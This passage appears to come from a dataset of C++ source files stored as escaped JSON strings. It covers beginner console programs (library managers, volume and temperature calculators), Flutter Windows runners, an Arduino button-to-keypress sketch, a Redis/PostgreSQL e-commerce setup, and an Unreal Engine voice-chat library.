fn)//\u8bbe\u7f6efd_\u8bfb\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\n{\n    readcallback_ = fn;\n}\n\nvoid Channel::setclosecallback(std::function<void()> fn)//\u8bbe\u7f6efd_\u5173\u95ed\u7684\u56de\u8c03\u51fd\u6570\n{\n    closecallback_ = fn;\n}\n\nvoid Channel::seterrorcallback(std::function<void()> fn)//\u8bbe\u7f6efd_\u9519\u8bef\u7684\u56de\u8c03\u51fd\u6570\n{\n    errorcallback_ = fn;\n}\n\nvoid Channel::setwritecallback(std::function<void()> fn)//\u8bbe\u7f6efd_\u9519\u8bef\u7684\u56de\u8c03\u51fd\u6570\n{\n    writecallback_ = fn;\n}",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <filesystem>\n#include <vector>\n\n// Reminder to kohu: pls comment what everything does\n// make it possible that books can have modifiable statuses, for example: \"reserved\", \"borrowed\" and \"available\"\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\nvoid callLooper(string j);\nvoid inspectBook(string myBox);\nvoid contentReader(string myBox);\nbool isRunning = true;\n\nstring basepath{ \"C:/../repos/libraryProject/BOOKS/\" };\n// ifstream example(basepath + \"example.txt\");\n// fstream required(basepath + \"req.txt\", ios::app);\n// string help = \"===== List of commands =====\\nShow all the books in a list - E\\nShow details about a book - F [name of the book]\\nAdd book to archive - W [name of the book]\\nRead a book's contents - S [name of the book]\\nDelete a book - Q [name of the book]\\nHelp - H\";\nstring help = \"\\n===== List of commands =====\\nQuit the library - Q\\nList of all the books - G\\nAdd book to archive - W\\nShow details about a book - Z [name of the book]\\nRead the contents of a book - F [name of the book]\\nClear console - C\\n=====\\n\";\nclass crazy {\nprivate:\n\tstring title{};\n\tstring ISBN{};\n\tstring author{};\n\tstring publisher{};\n\tstring date{};\n\tstring language{};\n\tstring subjMatter{};\n\tstring status{};\n\npublic:\n\tvoid addBook() {\n\t\tcout << \"\\n=====\\n\" << \"Enter the book's title: \";\n\t\tstd::getline(std::cin >> std::ws, title);\n\t\tcout << \"ISBN: \";\n\t\tstd::getline(std::cin >> std::ws, ISBN);\n\t\tcout << \"Author: \";\n\t\tstd::getline(std::cin >> std::ws, author);\n\t\tcout << \"Publisher: \";\n\t\tstd::getline(std::cin >> std::ws, publisher);\n\t\tcout << \"Date: \";\n\t\tstd::getline(std::cin >> std::ws, date);\n\t\tcout << \"Language: \";\n\t\tstd::getline(std::cin >> std::ws, language);\n\t\tcout << \"Subject matter: \";\n\t\tstd::getline(std::cin >> std::ws, subjMatter);\n\t\tcout << \"Status: \";\n\t\tstd::getline(std::cin >> std::ws, status);\n\t\twriteDetails(title, ISBN, author, publisher, date, language, subjMatter, status);\n\t\tcout << \"Finished! \\n\";\n\t\tcout << \"=====\\n\";\n\t}\n\tvoid readBook(string x) {\n\t\tcallLooper(x);\n\t}\n\tvoid writeDetails(string a, string b, string c, string d, string e, string f, string g, string h) {\n\t\tstring filenamer = a;\n\t\tremove(filenamer.begin(), filenamer.end(), ' ');\n\t\t// filenamer.erase(remove_if(filenamer.begin(), filenamer.end(), isspace), filenamer.end());\n\t\tfstream bookDetails(basepath + filenamer + \".txt\", ios::app);\n\t\tbookDetails << \"@\\n\";\n\t\tbookDetails << '\"' << title << '\"' << '\\n';\n\t\tbookDetails << \"ISBN: \" << ISBN << '\\n';\n\t\tbookDetails << \"Author: \" << author << '\\n';\n\t\tbookDetails << \"Publisher: \" << publisher << '\\n';\n\t\tbookDetails << \"Date: \" << date << '\\n';\n\t\tbookDetails << \"Language: \" << language << '\\n';\n\t\tbookDetails << \"Subject matter: \" << subjMatter << '\\n';\n\t\tbookDetails << \"Status: \" << status << '\\n';\n\t\tbookDetails << \"@\\n\";\n\t\tbookDetails.seekg(0);\n\t\tbookDetails.close();\n\t}\n};\n\nint main()\n{\n\tcrazy book1;\n\n\twhile (isRunning) {\n\t\ttry { \n\t\t\tcout << \"\\nLibrary home screen\\ntype 'h' for help\\n\";\n\t\t\tstring x{};\n\t\t\tstd::getline(std::cin >> std::ws, x);\n\t\t\ttransform(x.begin(), x.end(), x.begin(), ::tolower);\n\n\t\t\tif (x == \"w\") {\n\t\t\t\tbook1.addBook();\n\t\t\t}\n\t\t\telse if (x[0] == 'z') {\n\t\t\t\tbook1.readBook(x);\n\t\t\t}\n\t\t\telse if (x == \"h\") {\n\t\t\t\tcout << help;\n\t\t\t}\n\t\t\telse if (x == \"q\") {\n\t\t\t\tcout << \"\\nLeaving library. Shutting down.\\n\";\n\t\t\t\t// bookDetails.close();\n\t\t\t\t// example.close();\n\t\t\t\t// required.close();\n\t\t\t\tisRunning = false;\n\t\t\t}\n\t\t\telse if (x == \"g\") {\n\t\t\t\tfor (const auto& entry : fs::directory_iterator(basepath)) {\n\t\t\t\t\tcout << entry.path().filename() << '\\n';\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (x[0] == 'f') {\n\t\t\t\tbook1.readBook(x);\n\t\t\t}\n\t\t\telse if (x == \"c\") {\n\t\t\t\tsystem(\"cls\");\n\t\t\t}\n\n\t\t\telse {\n\t\t\t\tthrow x;\n\t\t\t}\n\t\t}\n\t\tcatch (string l) {\n\t\t\tcout << \"\\nEntered: \" << l;\n\t\t\tcout << \"\\nInvalid input, try again.\\n\";\n\t\t}\n\t}\n\t// required.close();\n\t// example.close();\n\t// bookDetails.close();\n\treturn 0;\n}\n\nvoid callLooper(string j) {\n\ttry {\n\t\tif (j[0] == 'z') {\n\t\t\tsize_t pos = j.find(' ') + 1;\n\t\t\tj.erase(0, pos);\n\t\t\t// cout << \"Debug callLooper:\\n\" << j << '\\n';\n\t\t\tvector<string> myBox = {};\n\t\t\tmyBox.push_back(j);\n\t\t\t// cout << myBox[0] << \" it reached the box yey!\";\n\t\t\t// loop through every text file name in file \"BOOKS\"\n\t\t\tfor (const auto& entry : fs::directory_iterator(basepath)) {\n\t\t\t\tif (myBox[0] == entry.path().filename()) {\n\t\t\t\t\tinspectBook(myBox[0]);\n\t\t\t\t}\n\t\t\t\telse if (myBox[0] == \"\") {\n\t\t\t\t\tcout << \"Bad input.\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse if (j[0] == 'f') {\n\t\t\tsize_t pos = j.find(' ') + 1;\n\t\t\tj.erase(0, pos);\n\t\t\tvector<string> myBox = {};\n\t\t\tmyBox.push_back(j);\n\t\t\t// loop through every text file name in file \"BOOKS\"\n\t\t\tfor (const auto& entry : fs::directory_iterator(basepath)) {\n\t\t\t\tif (myBox[0] == entry.path().filename()) {\n\t\t\t\t\tcontentReader(myBox[0]);\n\t\t\t\t}\n\t\t\t\telse if (myBox[0] == \"\") {\n\t\t\t\t\tcout << \"Bad input.\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t\tmyBox.clear();\n\t\t\tcout << \"\\n\\nmyBox has been cleared()\";\n\t\t}\n\t}\n\tcatch (...){\n\t\tcout << \"Error. Unexpected interruption.\" <<",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"google_wallet\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Arduino.h>\n#include <Keyboard.h>\n#include <AceButton.h>\nusing namespace ace_button;\n\nconst int PIN_BUTTON = 11;\n\nAceButton button(PIN_BUTTON);\n\nvoid handleEvent(AceButton *, uint8_t, uint8_t);\n\nbool mac = true;\n\nvoid setup()\n{\n  ButtonConfig *buttonConfig = ButtonConfig::getSystemButtonConfig();\n  buttonConfig->setEventHandler(handleEvent);\n  buttonConfig->setFeature(ButtonConfig::kFeatureLongPress);\n  buttonConfig->setLongPressDelay(300);\n\n  pinMode(PIN_BUTTON, INPUT_PULLUP);\n\n  // Hold the button while plugin the USB cable to switch between MacOS and Linux/Windows\n  // Default is MacOS\n  mac = !button.isPressedRaw();\n}\n\nvoid loop()\n{\n  button.check();\n}\n\nvoid handleEvent(AceButton *button, uint8_t eventType, uint8_t buttonState)\n{\n  if (eventType == AceButton::kEventPressed)\n  {\n    if (mac)\n    {\n      Keyboard.press(KEY_LEFT_GUI);\n      Keyboard.press(KEY_RIGHT_ARROW);\n    }\n    else\n    {\n      Keyboard.press(KEY_LEFT_CTRL);\n      Keyboard.press(KEY_RIGHT_ARROW);\n    }\n    delay(10);\n    Keyboard.releaseAll();\n  }\n\n  if (eventType == AceButton::kEventLongPressed)\n  {\n    Keyboard.press(KEY_TAB);\n    delay(10);\n    Keyboard.releaseAll();\n  }\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm> // Include this for std::find and std::find_if\r\n#include <limits>\r\n\r\nusing namespace std;\r\n\r\n// Base class representing a generic User\r\nclass User {\r\nprotected:\r\n    int userID;\r\n    string name;\r\n    string email;\r\npublic:\r\n    // Constructor to initialize user properties\r\n    User(int id, string n, string e) : userID(id), name(n), email(e) {}\r\n\r\n    // Virtual function to login the user\r\n    virtual void login() {\r\n        cout << name << \" logged in.\" << endl;\r\n    }\r\n\r\n    // Virtual function to logout the user\r\n    virtual void logout() {\r\n        cout << name << \" logged out.\" << endl;\r\n    }\r\n\r\n    // Virtual function to display user information\r\n    virtual void displayInfo() {\r\n        cout << \"UserID: \" << userID << \", Name: \" << name << \", Email: \" << email << endl;\r\n    }\r\n\r\n    // Getter for the user's name\r\n    string getName() const {\r\n        return name;\r\n    }\r\n\r\n    // Pure virtual function to show the menu\r\n    virtual void showMenu() = 0;\r\n};\r\n\r\n// Derived class representing an Admin user\r\nclass Admin : public User {\r\npublic:\r\n    // Constructor to initialize admin properties\r\n    Admin(int id, string n, string e) : User(id, n, e) {}\r\n\r\n    // Function to add a book to the library\r\n    void addBook(string title, string author, string genre) {\r\n        cout << \"Book added by Admin: Title: \" << title << \", Author: \" << author << \", Genre: \" << genre << endl;\r\n    }\r\n\r\n    // Function to remove a book from the library\r\n    void removeBook() {\r\n        cout << \"Book removed by Admin.\" << endl;\r\n    }\r\n\r\n    // Override function to show admin-specific menu\r\n    void showMenu() override {\r\n        cout << \"\\nAdmin Menu:\\n\";\r\n        cout << \"1. Add Book\\n\";\r\n        cout << \"2. Remove Book\\n\";\r\n        cout << \"3. Display All Books\\n\";\r\n        cout << \"4. Display Available Books\\n\";\r\n        cout << \"5. Logout\\n\";\r\n        cout << \"Choose an option: \";\r\n    }\r\n};\r\n\r\n// Derived class representing a Member user\r\nclass Member : public User {\r\nprivate:\r\n    vector<int> borrowedBooks; // List of borrowed book IDs\r\npublic:\r\n    // Constructor to initialize member properties\r\n    Member(int id, string n, string e) : User(id, n, e) {}\r\n\r\n    // Function to borrow a book\r\n    void borrowBook(int bookID) {\r\n        borrowedBooks.push_back(bookID);\r\n        cout << \"Book borrowed: \" << bookID << endl;\r\n    }\r\n\r\n    // Function to return a borrowed book\r\n    void returnBook(int bookID) {\r\n        auto it = find(borrowedBooks.begin(), borrowedBooks.end(), bookID);\r\n        if (it != borrowedBooks.end()) {\r\n            borrowedBooks.erase(it);\r\n            cout << \"Book returned: \" << bookID << endl;\r\n        } else {\r\n            cout << \"Book not found in borrowed list.\" << endl;\r\n        }\r\n    }\r\n\r\n    // Function to show the list of borrowed books\r\n    void showBorrowedBooks() {\r\n        cout << \"Borrowed Books: \";\r\n        for (int id : borrowedBooks) {\r\n            cout << id << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n\r\n    // Override function to show member-specific menu\r\n    void showMenu() override {\r\n        cout << \"\\nMember Menu:\\n\";\r\n        cout << \"1. Borrow Book\\n\";\r\n        cout << \"2. Return Book\\n\";\r\n        cout << \"3. Display All Books\\n\";\r\n        cout << \"4. Display Available Books\\n\";\r\n        cout << \"5. Display My Borrowed Books\\n\";\r\n        cout << \"6. Logout\\n\";\r\n        cout << \"Choose an option: \";\r\n    }\r\n};\r\n\r\n// Class representing a Book\r\nclass Book {\r\nprivate:\r\n    int bookID;\r\n    string title;\r\n    string author;\r\n    string genre;\r\n    bool isBorrowed;\r\npublic:\r\n    // Constructor to initialize book properties\r\n    Book(int id, string t, string a, string g) : bookID(id), title(t), author(a), genre(g), isBorrowed(false) {}\r\n\r\n    // Function to mark the book as borrowed\r\n    void borrowBook() {\r\n        isBorrowed = true;\r\n        cout << \"Book borrowed: \" << title << endl;\r\n    }\r\n\r\n    // Function to mark the book as returned\r\n    void returnBook() {\r\n        isBorrowed = false;\r\n        cout << \"Book returned: \" << title << endl;\r\n    }\r\n\r\n    // Function to display book information\r\n    void displayInfo() const {\r\n        cout << \"BookID: \" << bookID << \", Title: \" << title << \", Author: \" << author << \", Genre: \" << genre << endl;\r\n    }\r\n\r\n    // Getter for the book's title\r\n    string getTitle() const {\r\n        return title;\r\n    }\r\n\r\n    // Getter for the book's ID\r\n    int getID() const {\r\n        return bookID;\r\n    }\r\n\r\n    // Getter for the book's borrowed status\r\n    bool getStatus() const {\r\n        return isBorrowed;\r\n    }\r\n\r\n    // Setter for the book's borrowed status\r\n    void setStatus(bool status) {\r\n        isBorrowed = status;\r\n    }\r\n};\r\n\r\n// Class representing the Library\r\nclass Library {\r\nprivate:\r\n    vector<Book> books; // List of books in the library\r\n    vector<User*> users; // List of users in the library\r\n    int nextUserID = 1;\r\n    int nextBookID =",
    "#include <iostream>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\nint r, t, s, p, l, menu;\r\nchar n;\r\nfloat hasil;\r\nconst float pi = 3.14;\r\n\r\nvoid header()\r\n{\r\n    cout << \"+-----------------------------------------------+\" << endl;\r\n    cout << \"|   SELAMAT DATANG DI PROGRAM  MENCARI VOLUME   |\" << endl;\r\n    cout << \"+-----------------------------------------------+\" << endl;\r\n}\r\n\r\nvoid main_menu()\r\n{\r\n    system(\"cls\");\r\n    header();\r\n    cout << \"Volume apa yang kamu cari?\" << endl;\r\n    cout << \"1. Menghitung Volume Kerucut\" << endl;\r\n    cout << \"2. Menghitung Volume Bola\" << endl;\r\n    cout << \"3. Menghitung Volume Tabung\" << endl;\r\n    cout << \"4. Menghitung Volume Kubus\" << endl;\r\n    cout << \"5. menghitung Volume Balok\" << endl << endl;\r\n    cout << \"Tekan ~. Untuk Keluar\" << endl << endl;\r\n    cout << \"Pilih Menu : \";\r\n    cin >> menu;\r\n}\r\n\r\nvoid kerucut(int r, int t)\r\n{\r\n    system(\"cls\");\r\n    header();\r\n    hasil = 1.0 / 3.0 * pi * r * r * t;\r\n    cout << \"Volume Kerucut adalah \" << hasil << endl;\r\n}\r\n\r\nvoid bola(int r)\r\n{\r\n    system(\"cls\");\r\n    header();\r\n    hasil = 4.0 / 3.0 * pi * r * r * r;\r\n    cout << \"Volume Bola adalah \" << hasil << endl;\r\n}\r\n\r\nvoid tabung(int r, int t)\r\n{\r\n    system(\"cls\");\r\n    header();\r\n    hasil = pi * r * r * t;\r\n    cout << \"Volume Tabung adalah \" << hasil << endl;\r\n}\r\n\r\nvoid kubus(int s)\r\n{\r\n    system(\"cls\");\r\n    header();\r\n    hasil = s * s * s;\r\n    cout << \"Volume Kubus adalah \" << hasil << endl;\r\n}\r\nvoid balok(int p, int l, int t)\r\n{\r\n    system(\"cls\");\r\n    header();\r\n    hasil = p * l * t;\r\n    cout << \"Volume Balok adalah \" << hasil << endl;\r\n}\r\n\r\nint main()\r\n{\r\n    do{\r\n        main_menu();\r\n\r\n        if(menu == 1) {\r\n            system(\"cls\");\r\n            header();\r\n            cout << \"Masukkan jari-jari : \";\r\n            cin >> r;\r\n            cout << \"Masukkan tinggi : \";\r\n            cin >> t;\r\n            kerucut(r, t);\r\n        } else if(menu == 2) {\r\n            system(\"cls\");\r\n            header();\r\n            cout << \"Masukkan jari-jari : \";\r\n            cin >> r;\r\n            bola(r);\r\n        } else if(menu == 3) {\r\n            system(\"cls\");\r\n            header();\r\n            cout << \"Masukkan jari-jari : \";\r\n            cin >> r;\r\n            cout << \"Masukkan tinggi : \";\r\n            cin >> t;\r\n            tabung(r, t);\r\n        } else if(menu == 4) {\r\n            system(\"cls\");\r\n            header();\r\n            cout << \"Masukkan sisi : \";\r\n            cin >> s;\r\n            kubus(s);\r\n        } else if(menu == 5) {\r\n            system(\"cls\");\r\n            header();\r\n            cout << \"Masukkan panjang : \";\r\n            cin >> p;\r\n            cout << \"Masukkan lebar : \";\r\n            cin >> l;\r\n            cout << \"Masukkan tinggi : \";\r\n            cin >> t;\r\n            balok(p, l, t);\r\n        } else {\r\n            cout << \"Terima Kasih telah menggunakan Program ini. Tekan apapun untuk keluar.\";\r\n            getch();\r\n            return 0;\r\n        }\r\n\r\n        cout << \"Ingin menghitung lagi? (yes/no) ketik y atau n :  \";\r\n        cin >> n;\r\n        system(\"cls\");\r\n\r\n    } while(n == 'y' || n == 'Y');\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\nusing namespace std;\nint main() \n{\n    // Prompt the user to input a temperature value and the original unit of measurement.\n    float temperature;\n    char unit;\n    cout << \"Enter a temperature value: \";\n    cin >> temperature;\n    cout << \"Enter the original unit of measurement (C, F, or K): \";\n    cin >> unit;\n\n    // Convert the temperature to the other two units.\n    float fahrenheit, kelvin, celcius;\n    if (unit == 'C') \n    {\n        fahrenheit = (9.0 / 5.0) * temperature + 32.0;\n        kelvin = temperature + 273.15;\n    } \n    else if (unit == 'F') \n    {\n        celcius = (5.0 / 9.0) * (temperature - 32.0);\n        kelvin = (5.0 / 9.0) * (temperature - 32.0) + 273.15;\n    } \n    else if (unit == 'K') \n    {\n        celcius = temperature - 273.15;\n        fahrenheit = (9.0 / 5.0) * (temperature - 273.15) + 32.0;\n    } \n    else \n    {\n        cout << \"Invalid unit of measurement.\" << endl;\n        return 1;\n    }\n\n    // Display the converted values to the user.\n    cout << \"The temperature in Fahrenheit is: \" << fahrenheit << endl;\n    cout << \"The temperature in Kelvin is: \" << kelvin << endl;\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"country_list\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <pqxx/pqxx>\n#include <hiredis/hiredis.h>\n#include <thread>\n#include <chrono>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <time.h>\n#include <con2redis.h>\n#include <sys/wait.h>\n#include <cstring>\n#include <cstdlib>\n#include <ctime>\n#include <errno.h>\n\n#define C_CHANNEL \"stream1\"\n#define T_CHANNEL \"stream2\"\n#define F_CHANNEL \"stream3\"\n\nredisContext* initializeRedisConnection(char*& username, unsigned &seed, int &pid) {\n\n    seed = (unsigned) time(NULL);\n    srand(seed);\n\n    username = new char[100];\n\n    sprintf(username, \"%u\", rand());\n \n    pid = getpid();\n\n    printf(\"main(): pid %d: user %s: connecting to redis ...\\n\", pid, username);\n\n    redisContext* c2r = redisConnect(\"localhost\", 6379);\n\n    std::this_thread::sleep_for(std::chrono::seconds(1));\n\n    if (c2r == NULL || c2r->err) {\n        if (c2r) {\n            printf(\"Connection error: %s\\n\", c2r->errstr);\n            redisFree(c2r);\n        } else {\n            printf(\"Connection error: can't allocate redis context\\n\");\n        }\n        return NULL;\n    }\n    \n    printf(\"main(): pid %d: user %s: connected to redis\\n\", pid, username);\n\n    std::this_thread::sleep_for(std::chrono::seconds(1));\n\n    return c2r;\n\n}\n\nvoid deleteOldStreams(redisContext* c2r, redisReply* reply) {\n\n    reply = RedisCommand(c2r, \"DEL %s\", F_CHANNEL);\n    assertReply(c2r, reply);\n    dumpReply(reply, 0);\n\n    reply = RedisCommand(c2r, \"DEL %s\", T_CHANNEL);\n    assertReply(c2r, reply);\n    dumpReply(reply, 0);\n\n    reply = RedisCommand(c2r, \"DEL %s\", C_CHANNEL);\n    assertReply(c2r, reply);\n    dumpReply(reply, 0);\n\n    std::cout << \"\\nDeleted old streams\" << std::endl;\n\n}\n\nvoid initializeStreams(redisContext* c2r) {\n    initStreams(c2r, F_CHANNEL);\n    initStreams(c2r, T_CHANNEL);\n    initStreams(c2r, C_CHANNEL);\n}\n\nvoid execProgram(const char* program, const char* arg) {\n    pid_t pid = fork();\n    if(pid == 0) {\n        // Processo figlio\n        execl(program, program, arg, (char*) NULL);\n        // Se execl fallisce\n        std::cerr << \"Errore durante l'esecuzione di \" << program << std::endl;\n        std::cerr << \"Fork failed: \" << strerror(errno) << std::endl;\n        exit(EXIT_FAILURE);\n    } else if (pid < 0) {\n        std::cerr << \"Fork failed: \" << strerror(errno) << std::endl;\n    }\n}\n\nvoid setupDatabase() {\n    try {\n        pqxx::connection C(\"dbname=ecommerce user=youruser password=yourpassword hostaddr=127.0.0.1 port=5432\");\n        pqxx::work W(C);\n\n        W.exec(\"DROP TABLE IF EXISTS Ordini, Prodotti, Customers, Fornitori, Trasportatori CASCADE\");\n        W.exec(\"CREATE TABLE Customers (customer_id SERIAL PRIMARY KEY, name VARCHAR(100), email VARCHAR(100) UNIQUE, password VARCHAR(100), address VARCHAR(255), phone_number VARCHAR(15))\");\n        W.exec(\"CREATE TABLE Fornitori (fornitore_id SERIAL PRIMARY KEY, company_name VARCHAR(100), email VARCHAR(100) UNIQUE, password VARCHAR(100), address VARCHAR(255), phone_number VARCHAR(15))\");\n        W.exec(\"CREATE TABLE Trasportatori (trasportatore_id SERIAL PRIMARY KEY, company_name VARCHAR(100), email VARCHAR(100) UNIQUE, password VARCHAR(100), address VARCHAR(255), phone_number VARCHAR(15))\");\n        W.exec(\"CREATE TABLE Prodotti (prodotto_id SERIAL PRIMARY KEY, name VARCHAR(100), description TEXT, price DECIMAL(10, 2), fornitore_id INT REFERENCES Fornitori(fornitore_id))\");\n        W.exec(\"CREATE TABLE Ordini (ordine_id SERIAL PRIMARY KEY, customer_id INT REFERENCES Customers(customer_id), prodotto_id INT REFERENCES Prodotti(prodotto_id), quantity INT, order_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, status VARCHAR(50))\");\n\n        W.commit();\n        std::cout << \"Database setup complete.\" << std::endl;\n    } catch (const std::exception &e) {\n        std::cerr << e.what() << std::endl;\n    }\n}\n\nvoid testRedisConnection() {\n    redisContext *c = redisConnect(\"127.0.0.1\", 6379);\n    if (c != NULL && c->err) {\n        std::cerr << \"Error: \" << c->errstr << std::endl;\n    } else {\n        std::cout << \"Connected to Redis.\" << std::endl;\n    }\n    redisFree(c);\n}\n\n/*void simulateOperations() {\n    Customer customer1(1, \"John Doe\", \"john@example.com\", \"password123\", \"123 Main St\", \"555-1234\");\n    Customer customer2(2, \"Jane Smith\", \"jane@example.com\", \"password456\", \"456 Elm St\", \"555-5678\");\n\n    Fornitore fornitore1(1, \"Tech Corp\", \"tech@example.com\", \"password789\", \"789 Oak St\", \"555-8765\");\n    Fornitore fornitore2(2, \"Gadget Inc\", \"gadget@example.com\", \"password101\", \"101 Pine St\", \"555-1011\");\n\n    Trasportatore trasportatore1(1, \"Fast Delivery\", \"fast@example.com\", \"password112\", \"112 Cedar St\", \"555-1213\");\n    Trasportatore trasportatore2(2, \"Quick Ship\", \"quick@example.com\", \"password131\", \"131 Maple St\", \"555-1415\");\n\n    std::cout << \"Operations simulation complete.\" << std::endl;\n}*/\n\nvoid monitorTransactions() {\n    try {\n        pqxx::connection C(\"dbname=ecommerce user=youruser password=yourpassword hostaddr=127.0.0.1 port=5432\");\n        pqxx::n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n#include \"AdvancedVoiceLibrary.h\"\n\n\n//General Log\nDEFINE_LOG_CATEGORY(AdvancedVoiceLog);\n\nvoid UAdvancedVoiceLibrary::IsHeadsetPresent(UObject* WorldContextObject, bool & bHasHeadset, uint8 LocalPlayerNum)\n{\n\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tbHasHeadset = false;\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Check For Headset couldn't get the voice interface!\"));\n\t\treturn;\n\t}\n\n\tbHasHeadset = VoiceInterface->IsHeadsetPresent(LocalPlayerNum);\n}\n\nvoid UAdvancedVoiceLibrary::StartNetworkedVoice(UObject* WorldContextObject, uint8 LocalPlayerNum)\n{\n\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Start Networked Voice couldn't get the voice interface!\"));\n\t\treturn;\n\t}\n\n\tVoiceInterface->StartNetworkedVoice(LocalPlayerNum);\n}\n\nvoid UAdvancedVoiceLibrary::StopNetworkedVoice(UObject* WorldContextObject, uint8 LocalPlayerNum)\n{\n\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Start Networked Voice couldn't get the voice interface!\"));\n\t\treturn;\n\t}\n\n\tVoiceInterface->StopNetworkedVoice(LocalPlayerNum);\n}\n\nbool UAdvancedVoiceLibrary::RegisterLocalTalker(UObject* WorldContextObject, uint8 LocalPlayerNum)\n{\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn false;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Register Local Talker couldn't get the voice interface!\"));\n\t\treturn false;\n\t}\n\n\treturn VoiceInterface->RegisterLocalTalker(LocalPlayerNum);\n}\n\nvoid UAdvancedVoiceLibrary::RegisterAllLocalTalkers(UObject* WorldContextObject)\n{\n\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Register Local Talkers couldn't get the voice interface!\"));\n\t\treturn;\n\t}\n\n\tVoiceInterface->RegisterLocalTalkers();\n}\n\n\nvoid UAdvancedVoiceLibrary::UnRegisterLocalTalker(UObject* WorldContextObject, uint8 LocalPlayerNum)\n{\n\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Unregister Local Talker couldn't get the voice interface!\"));\n\t\treturn;\n\t}\n\n\tVoiceInterface->UnregisterLocalTalker(LocalPlayerNum);\n}\n\nvoid 